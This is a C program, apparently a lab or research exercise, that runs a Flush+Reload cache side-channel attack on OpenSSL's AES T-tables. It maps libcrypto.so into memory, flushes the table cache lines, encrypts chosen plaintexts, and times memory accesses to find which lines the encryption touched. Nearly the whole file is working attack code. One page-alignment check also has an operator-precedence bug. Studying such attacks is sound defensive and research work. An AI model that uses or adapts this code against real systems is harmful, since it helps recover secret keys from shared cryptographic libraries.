#include <stdio.h>
#include <openssl/aes.h>
#include <stdlib.h>
#include <time.h>
#include "fr_util.h"

//number of encryptions to observe
#define n_enc (10)

//bytes in plaintext, 128 bits
#define TXT_BYTES (16)

//in bytes
#define TABLE_SIZE (1024)
#define CACHE_LINESIZE (64)

//cache miss threshold, access time > threshold => cache miss
/*** SET THESE ADDRESSES FOR SYSTEM BEFORE RUNNING ***/
#define CACHE_MISS (355)

int main(int argc, char **argv) {
  srand(time(NULL));

  //key init, something easy to check
  const unsigned char key[] =
  {
    0x01, 0x10, 0x01, 0x10, 0x01, 0x10, 0x01, 0x10,
    0x01, 0x10, 0x01, 0x10, 0x01, 0x10, 0x01, 0x10,
    0x01, 0x10, 0x01, 0x10, 0x01, 0x10, 0x01, 0x10,
    0x01, 0x10, 0x01, 0x10, 0x01, 0x10, 0x01, 0x10
  };

  AES_KEY enc_key;
  AES_set_encrypt_key(key, 128, &enc_key);

  /*** SET THESE ADDRESSES FOR SYSTEM BEFORE RUNNING ***/
  //set addresses of T-tables (must be done by observing memory in debugger), see mem_locs.png

  //ALSO! if ./extract: error while loading shared libraries: libcrypto.so.1.1: cannot open shared object file: No such file or directory
  //error do this:
  //export LD_LIBRARY_PATH=/usr/local/lib

  ADDR_PTR te0, te1, te2, te3;
  te0 = 0x00000000001e6000;
  te1 = 0x00000000001e6400;
  te2 = 0x00000000001e6800;
  te3 = 0x00000000001e6c00;

  //get start and end of AES program
  ADDR_PTR start;
  ADDR_PTR end;

  int aes = open("/usr/local/lib/libcrypto.so", O_RDONLY);
  size_t size = lseek(aes, 0, SEEK_END);

  ///below courtesy of Daniel Gruss' template https://github.com/IAIK/cache_template_attacks/blob/main/profiling_aes_example/spy.cpp
  size_t map_size = size;
  if (map_size & 0xFFF != 0) {
    map_size |= 0xFFF;
    map_size += 1;
  }
  start = mmap(0, map_size, PROT_READ, MAP_SHARED, aes, 0);
  end = start + size;
  //

  te0 += start;
  te1 += start;
  te2 += start;
  te3 += start;

  for (int e = 0; e < n_enc; ++e) {
      unsigned char plaintxt[TXT_BYTES];
      unsigned char ciphertxt[TXT_BYTES];
      for (int i = 0; i < TXT_BYTES; ++i) {
        plaintxt[i] = rand() % 256;
      }

      //flush before encryption
      for (int ii = 0; ii < TABLE_SIZE; ii += CACHE_LINESIZE) {
        clflush(te0 + ii);
        clflush(te1 + ii);
        clflush(te2 + ii);
        clflush(te3 + ii);
      }

      /*** DEBUG ENCRYPTION  ***/

      // unsigned int len_p = 0;
      // printf("PLAIN:");
      // for(int i = 0; i < 16; i++) {
      //   ++len_p;
      //   printf("%d ", (unsigned char)plaintxt[i]);
      // }
      // printf("\nLENGTH PLAIN: %u ENC ROUND: %d\n", len_p, e);

      AES_encrypt(plaintxt, ciphertxt, &enc_key);

      /*** DEBUG ENCRYPTION  ***/
      
      // unsigned int len_c = 0;
      // printf("CIPHER:");
      // for(int i = 0; i < 16; i++) {
      //   ++len_c;
      //   printf("%d ", (unsigned char)ciphertxt[i]);
      // }
      // printf("\nLENGTH CIPHER: %u ENC ROUND: %d\n", len_c, e);

      //proceed to test access times for Te0, ..., Te3

      //Te0
      for (int ii = 0; ii < TABLE_SIZE; ii += CACHE_LINESIZE) {
        ADDR_PTR test_addr = te0 + ii;

        if (test_addr > end) {
          printf("accessing past boundaries of AES program... not good\n");
        }

        printf("... TESTING ADDRESS %lx ...\n", test_addr);
        clflush(test_addr);
        AES_encrypt(plaintxt, ciphertxt, &enc_key);
        CYCLES acc_time = maccess_t(test_addr);
        if (acc_time < CACHE_MISS) {
          printf(GREEN "        HIT " RESET "%lu\n", acc_time);
        } else {
          printf(RED "        MISS " RESET "%lu\n", acc_time);
        }

      }
      
  }

  return 0;
}